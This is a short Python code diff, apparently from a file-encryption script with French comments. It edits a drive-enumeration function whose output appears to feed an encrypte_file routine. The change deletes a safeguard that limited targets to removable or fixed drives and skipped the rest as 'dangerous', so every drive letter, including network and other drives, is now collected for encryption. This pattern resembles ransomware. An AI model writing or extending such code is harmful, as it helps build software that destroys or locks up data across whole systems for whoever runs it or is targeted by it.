@@ -223,14 +223,7 @@ def get_existing_root_path():
     for letter in string.ascii_uppercase:
         drive = f"{letter}:/"
         if Path(drive).exists():
-            try:
-                    drive_type = ctypes.windll.kernel32.GetDriveTypeW(f"{letter}:/")
-                    if drive_type in [2, 3]:  # Amovible ou fixe uniquement
-                        root_paths.append(drive)
-                    else:
-                        print(f"Ignoré (non disque ou dangereux) : {drive} (type {drive_type})")
-            except Exception as e:
-                    print(f"Erreur détection disque {drive} : {e}")
+            root_paths.append(drive)
     return root_paths
 
 def encrypte_file(input_file):
